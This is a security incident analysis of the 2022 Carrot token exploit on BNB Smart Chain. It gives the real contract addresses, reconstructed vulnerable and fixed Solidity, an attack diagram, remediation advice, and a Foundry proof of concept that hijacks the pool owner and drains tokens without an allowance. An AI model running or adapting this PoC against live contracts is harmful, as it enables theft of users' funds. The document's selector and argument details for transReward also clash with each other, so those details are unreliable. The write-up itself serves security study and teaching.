# Carrot — transReward() Ownership Hijack and transferFrom Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10-10 |
| **Protocol** | Carrot Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~$31,318 BUSDT |
| **Vulnerable Contract** | [0xcFF086EaD392CcB39C49eCda8C974ad5238452aC](https://bscscan.com/address/0xcFF086EaD392CcB39C49eCda8C974ad5238452aC) |
| **Attack Contract** | [0x5575406ef6b15eec1986c412b9fbe144522c45ae](https://bscscan.com/address/0x5575406ef6b15eec1986c412b9fbe144522c45ae) |
| **Attacker** | [0xd11a93a8db5f8d3fb03b88b4b24c3ed01b8a411c](https://bscscan.com/address/0xd11a93a8db5f8d3fb03b88b4b24c3ed01b8a411c) |
| **Pool** | [0x6863b549bf730863157318df4496ed111adfa64f](https://bscscan.com/address/0x6863b549bf730863157318df4496ed111adfa64f) |
| **Carrot/BUSDT Pair** | [0xF34c9a6AaAc94022f96D4589B73d498491f817FA](https://bscscan.com/address/0xF34c9a6AaAc94022f96D4589B73d498491f817FA) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **BUSDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Root Cause** | `transReward()` (selector: `0xbf699b4b`) allows changing the pool owner without any access control, enabling subsequent `transferFrom()` bypass |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Carrot_exp.sol) |

---
## 1. Vulnerability Overview

The Carrot token protocol allowed the Pool owner to be changed via the `transReward()` function (selector: `0xbf699b4b`), but this function had no access control. The attacker used `transReward()` to set themselves as the Pool owner, then exploited a gap in the `_beforeTransfer()` access control logic to transfer Carrot tokens from other addresses via `transferFrom()` without any allowance. The stolen Carrot was sold for BUSDT on PancakeSwap, netting approximately $31,318.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable transReward() - no access control
contract CarrotToken {
    address public poolOwner;

    // ❌ Anyone can change the pool owner to themselves
    function transReward(address newOwner) external {
        // ❌ No onlyOwner or any other access control
        poolOwner = newOwner;
    }

    // ❌ Vulnerable _beforeTransfer() - trusts poolOwner
    function _beforeTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        // pool owner can transfer tokens without allowance
        if (msg.sender == poolOwner) {
            return; // ❌ Attacker who became poolOwner bypasses all checks
        }
        // For regular users, validate allowance
        uint256 currentAllowance = allowance(from, msg.sender);
        require(currentAllowance >= amount, "Insufficient allowance");
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _beforeTransfer(from, to, amount);
        _transfer(from, to, amount); // transfer without deducting allowance
        return true;
    }
}

// ✅ Correct pattern
contract SafeCarrotToken {
    function transReward(address newOwner) external onlyOwner {
        // ✅ Only the current owner can change
        poolOwner = newOwner;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // ✅ Standard ERC20 allowance check (no poolOwner exception)
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**Carrot_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: `transReward()` (selector: `0xbf699b4b`) can change pool owner without access control, enabling subsequent `transferFrom()` bypass
    function transReward(bytes arg0) external {}  // 0xbb7bf89f  // ❌ Vulnerability

    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Call transReward(attacker) (selector: 0xbf699b4b)
    │       ❌ No access control → poolOwner = attacker
    │
    ├─[2] Query Carrot balances of victim addresses
    │
    ├─[3] Call transferFrom(victim, attacker, victimBalance)
    │       ├─ Enter _beforeTransfer()
    │       ├─ msg.sender == poolOwner → ✅ (attacker is poolOwner)
    │       └─ ❌ Victim's tokens transferred without allowance check
    │
    ├─[4] Stolen Carrot → Sell for BUSDT (PancakeRouter)
    │
    └─[5] Net profit: ~$31,318 BUSDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ICarrot {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    // ❌ Owner change function with no access control
    function transReward(address newOwner) external;
    // ❌ poolOwner can call transferFrom without allowance
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract CarrotExploit is Test {
    ICarrot carrot = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 BUSDT   = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address pool   = 0x6863b549bf730863157318df4496ed111adfa64f;

    function setUp() public {
        vm.createSelectFork("bsc", 22_055_611);
    }

    function testExploit() public {
        address attacker = address(this);
        emit log_named_decimal_uint("[Start] BUSDT Balance", BUSDT.balanceOf(attacker), 18);

        // [Step 1] Hijack pool owner via transReward()
        // ⚡ selector 0xbf699b4b, no access control
        carrot.transReward(attacker);

        // [Step 2] Query Carrot balance held by Pool
        uint256 poolBalance = carrot.balanceOf(pool);
        emit log_named_decimal_uint("[Pool Carrot]", poolBalance, 18);

        // [Step 3] Drain all Carrot from Pool without allowance
        // ⚡ As poolOwner(=attacker), passes _beforeTransfer() check
        carrot.transferFrom(pool, attacker, poolBalance);

        // [Step 4] Sell Carrot → BUSDT
        carrot.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(carrot);
        path[1] = address(BUSDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            carrot.balanceOf(attacker), 0, path, attacker, block.timestamp
        );

        emit log_named_decimal_uint("[End] BUSDT Balance", BUSDT.balanceOf(attacker), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unauthorized ownership change + transferFrom allowance bypass |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Admin privilege hijacking + token theft |
| **Attack Vector** | `transReward(attacker)` → `transferFrom(pool, attacker, balance)` |
| **Preconditions** | No access control on `transReward()`, allowance exemption granted to poolOwner |
| **Impact** | ~$31,318 BUSDT lost |

---
## 6. Remediation Recommendations

1. **Protect `transReward()`**: Add an `onlyOwner` modifier so that only the current owner can change the pool owner.
2. **Remove poolOwner allowance exemption**: Apply standard ERC20 allowance validation in `transferFrom()` even for the poolOwner. If allowance exemption is required for pool operations, use a separate, explicit approval mechanism.
3. **Use OpenZeppelin ERC20 standard**: Inherit OpenZeppelin's standard `transferFrom()` instead of implementing a custom `_beforeTransfer()`.

---
## 7. Lessons Learned

- **Protect privileged role change functions**: All functions that change privileged roles — such as `setOwner()`, `transferOwnership()`, and `transReward()` — must only be callable by the current privilege holder.
- **Dangers of custom transferFrom**: When customizing the ERC20 standard's `transferFrom()`, adding logic that selectively bypasses allowance validation creates a critical vulnerability. Extreme caution is required whenever deviating from the standard implementation.
- **Function identification via selector**: The `0xbf699b4b` selector used in the attack corresponds to the `transReward(address)` function. Even when a function name is ambiguous, it can be identified and exploited via its selector.